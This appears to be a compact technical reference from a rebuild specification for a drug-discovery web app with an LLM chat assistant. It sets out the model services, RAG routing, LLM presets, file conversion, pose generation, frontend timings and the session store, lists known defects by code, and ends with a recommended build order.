── ChemBERT service ─────────────────────────────────────────────────────────────
max_len 256 · nhead 16 · feature_dim 1024 · ff 1024 · nlayers 8 · adj True · dropout 0
head Linear(1024,1) · prediction from out[:,0,0] · position ids torch.arange(256)
batch_size 1 · num_workers 0 · device cuda:0 if available · cache keyed by model_path, NO lock (G5)
checkpoint kind next(iter(state)).startswith('bert.') ⇒ finetuned, else pretrained (random head)
plotted value   Adjacency_embedding.weight_a — a STATIC (256,) parameter, NOT attention   (G10)
atom slice      w[1 : n_atoms+1]  (skips <start>) — position≠atom for non-trivial SMILES
normalisation   (v - vmin)/(vmax - vmin + 1e-8)  ⇒ collapses on a degenerate domain       (G56)
colour ramp     #3b4cc0 → #dddcdc → #b40426 (two-segment coolwarm), defined THREE times

── RAG router ───────────────────────────────────────────────────────────────────
encoder         all-MiniLM-L6-v2, CPU, 384-dim (read from embs.shape[1], never hardcoded)
index           IndexFlatIP over per-row L2-normalised vectors ⇒ IP == cosine
encode batch    64 · top_k 5 · fetched k = min(top_k*6, N) = 30, filtered AFTER              (G37)
threshold       0.42 accept · >0.70 'high' else 'medium' · keyword fallback accepts >0.45
corpus          one vector per trigger + one synthetic 'tool action' vector per action
rebuild         iff max(mtime KB/*.md) > mtime(index) — the glob INCLUDES the template       (G36)
KB schema       # Tool: · ## action: · **btnId:** · **triggers:** + '- ' lines · **response:** (1 line)
                field ORDER is mandatory: any '**' line terminates the trigger block         (G36)

── auto-learner ─────────────────────────────────────────────────────────────────
params          temperature 0.2 · max_tokens 600 · top_p 0.9                                 (G34)
parse           re.search(r'<output>(.*?)</output>', DOTALL) then strict json.loads
guards          btnId in whitelist · action matches ^[a-z][a-z0-9_]+$
dedup           btnId in content OR action in content   ← OR, not AND                        (G32)
hot-inject      unconditional, outside both dedup checks, index never re-saved                (G32)
trigger #1      the RAW user message                                                          (G33)

── LLM presets (temperature / max_tokens / top_p) ───────────────────────────────
PRO 0.7/8192/0.95  ← equals n_ctx (G40)      FREE 0.8/2048/0.9      COACH 0.75/600/0.95
COT_ROUTING 0.3/1024/0.9                     PLANNER 0.3/512/0.9    PROFILER 0.0/15/1.0
TOOL 0.2/1024/0.9  EXTRACTOR 0.2/400/0.9     COMPACT 0.3/800/0.9    REFLECT 0.4/400/0.9
CORRECTION 0.5/600/0.9                       default 0.7/600/0.95
chat stream      temperature 0.5 · max_tokens 120 (guided) / 80 (frustrated) / 200 (default)
stop             p.stop OR the ChatML terminators — 'or' REPLACES, use concatenation          (G39)

── conversion ───────────────────────────────────────────────────────────────────
obabel          --partialcharge gasteiger · -xr (receptor, rigid) · -h (ligand) · timeout 60
sanitiser       receptor keeps ATOM/HETATM/TER/END · ligand also ROOT/ENDROOT/TORSDOF/BRANCH
                blank chain ID forced to 'A'  ·  exists because obabel copies TITLE/REMARK   (G46)
RDKit fallback  ligand: AddHs(addCoords) → ETKDGv3+MMFF only if no conformer → TORSDOF 0     (G43)
                receptor: passthrough cols 0-65, overwrite tail with charge + type
box calculator  _pdbqt_center: first MODEL only · ATOM+HETATM · skip AutoDock types H/HD/HS
                centre = HEAVY-ATOM centroid · size = max(20, ceil(max extent) + 8), one cube
                (the removed Get Ligand Center tool used a different rule — §23.4)

── DeepAtom service ─────────────────────────────────────────────────────────────
grid 32³ voxels · voxel size 1.0 Å · 24 input channels · width multiplier 2.0 · dropout 0.0
model wrapped in DataParallel(device_ids=[]) so 'module.'-prefixed checkpoints load on CPU
weights = first *.tar (then *.pk) in the model dir, sorted · cached per directory
saliency = sqrt((grad**2).sum(axis=0)) — SIGN DISCARDED, input omitted                        (G47)
atom → voxel: round((coord - origin)/voxel_size), clamped to [0, N-1]                         (G48)

── frontend ─────────────────────────────────────────────────────────────────────
libs            Tailwind CDN (UNPINNED) · jQuery 3.6.0 · Plotly 2.32.0 — the only chart/3D lib
storage         none — no localStorage, no sessionStorage, no CSS custom properties
z-index         5 spinner · 50 header · 199/200 sidebar · 9999 modals · 10000 drawer
                10001/10002 voxel · 10100 tool modals · 10150 progress panel · 10200 mini-chats
timings         2000 ms every highlight revert · 2100 ms pulse → 3000/5000 ms glow (medium/high)
                1800 ms converter reset · 400 ms welcome · 300 ms retry (unbounded — G57)
TS speeds       warmup [1200,800,500,300,150] ms · belief [1400,950,600,350,180] ms (slider 1-5)
TS throttles    bars every 50 updates (rAF) · log batch cap 150 · DOM cap 200 · status 1 Hz
TS worker       Welford online μ/σ · top-5 recomputed every 200 updates · reagent cap 8000
                new-reagent reject below 0.75 × fifth-best
progress bar    percent = min(100, round(stars/51*100))   ← 51 is the hardcoded bar width
SSE sentinels   __DONE__ · __BARCH__stars: · __BARCH__sep: · __BAR__pct · ': ping' · ': keep-alive'
SSE headers     Cache-Control: no-cache · X-Accel-Buffering: no   (the second defeats nginx buffering)

── sessions (⧉) ─────────────────────────────────────────────────────────────────
sessions(id PK, ip, chat_type, created_at, updated_at, model DEFAULT '<key>', turn_count DEFAULT 0)
turns(id PK, session_id → sessions(id), role, content, created_at)
UNIQUE INDEX (ip, chat_type) · INDEX (session_id) · timestamps UTC ISO-8601, seconds
identity        X-Forwarded-For[0] → remote_addr → "unknown"   ← CLIENT-CONTROLLED  (G69)
reads           mini-chat last 20 · /session/history last 40 · prompt uses last 6
                CoT prompt uses last 3, each truncated to 200 chars · preview 3 turns × 120 chars
concurrency     NO WAL, NO busy_timeout anywhere · check_same_thread=False on every connect
                three connection strategies: import-time, Flask-g (one route), per-call (the rest)
                SELECT-then-INSERT against a UNIQUE index, errors swallowed → turns silently lost (G70)
never pruned    the turns table grows forever; only an explicit clear deletes

── chat + CoT ───────────────────────────────────────────────────────────────────
prompt          system(guided|general) + last 6 turns + ctx block + user + assistant turn
token budget    120 guided · 80 when the emotion classifier fires · 200 default · temp 0.5
cascade         guided-reply match → keyword/RAG → CoT → "now what" heuristic → auto-learn
CoT             a SECOND, BLOCKING call after streaming ends; product is one small JSON action
                prompt ends in a literal `think` role token
parse           strip fences → findall(r'\{[^{}]+\}') → LAST match   ← non-recursive: nesting fails
gates           action ∈ whitelist · confidence ∈ {high, medium} · action != 'none'
storage         two append-only file loggers, propagate=False, NO rotation, NO size cap, never read back
KB cache        read-once-forever; a failed read caches "" PERMANENTLY and disables CoT

── pose generation (⬢) ──────────────────────────────────────────────────────────
limits          150 heavy atoms (build) · 300 (ligand-vs-receptor split, mirrored client-side)
                scan 5000 files / 8000 lines · zip 512 MB · react limit 500
embed           ETKDGv3, FIXED seed, retry useRandomCoords → MMFF(400) → UFF(400) fallback
torsion tree    delete rotatable bonds → components → LARGEST is ROOT → BFS → {from,to,moves[]}
                all kinematics happen in the BROWSER
rot SMARTS      strict: excludes triple bonds, terminal atoms, CX3, t-Bu, amide-like C(=X)-N/O/S
vina (3rd copy) pair cutoff 8.0 Å · bbox pre-filter 2.5 Å · ΔG = Σe/(1 + w_rot·N_rot) · pk = −ΔG/1.36
                weights += rot 0.05846 (the docking-route copy lacks it)
errors          EVERY failure is HTTP 200 {ok:false, err} — deliberate; the client falls back locally
interactions    H-bond N/O↔N/O < 3.5 Å · salt bridge < 4.2 Å · π–π centroid < 6.0 Å

── TS frontend (⟐) ──────────────────────────────────────────────────────────────
load order      core → chart → ui → warmup → worker_bridge → run     (serial, load-bearing)
shared state    ONE mutable global object; no module boundary, only file boundaries
authority       backend emits `[TS:stats] iter= mean= std= score=`; the worker syncs and RETURNS
                its own accumulator is deliberately NOT called on that path  ⇒ live == replayed (G89)
top-5           ranked by BEST molecule score (monotonic), not mean · hysteresis margin 0.15
                throttled to ~10 Hz · unscored reagents sort below all scored ones
throttles       repaint every 50 updates · 8 ms rAF drain budget · log cap 200 · warmup log cap 150
                sparkline 2000 displayed / 60000 full buffer · event trim at 100, keep 50
polls           jobs status 5 s · top-5 5 s · speed meter 1 s · reconnect 8 retries × 2 s
seeding         batch size, log level, iteration offset + last 256 scores, reagents + top-5 ids
corrupt guard   points > scores × 1.4 ⇒ trust scores length and warn

── removed tools ────────────────────────────────────────────────────────────────
not shipped     Workflow · Handoff Manager · Get Ligand Center · the second LLM gateway
Reasoning btn   KEPT, as an external link: config.REASONING_URL, env UI_REASONING_URL,
                default http://localhost:5001/ · no data-nav · noopener,noreferrer
                rendered by hub_routes.hub() as the page's ONLY template variable
do NOT grep     'ligCenter' in pose.js / pose_generation.html is pose-frame geometry (G85)
```

*Build order recap:* config module → app singleton + loader → shared state (**keyed, locked, reaped**) →
**the session store** → one trivial route → the docking core (byte reader + timed flusher + terminating
SSE) → the model service → background jobs → the RAG router → the KB → the auto-learner → the frontend
shell → the **unified** mini-chat → pose generation → the TS frontend → the remaining tools. The router
goes **after** the frontend action map exists, because the KB is written against it — and the
cross-reference test between the two is the single most valuable thing to write first.

The session store moves **early** in this revision, ahead of everything that holds conversational state,
because every §4 defect and three of the new ones (G71, G72, G84) are the same defect: state that should
have been keyed by a client was keyed by the process instead. Build the keyed store first and the
in-memory fallbacks never get written. Pose generation goes late because it is the only feature that owns
its own physics; the TS frontend goes last among the frontends because it is the only one that has to
agree with a backend about a *number* (G89), and that agreement is easier to establish once everything
else it depends on is stable.
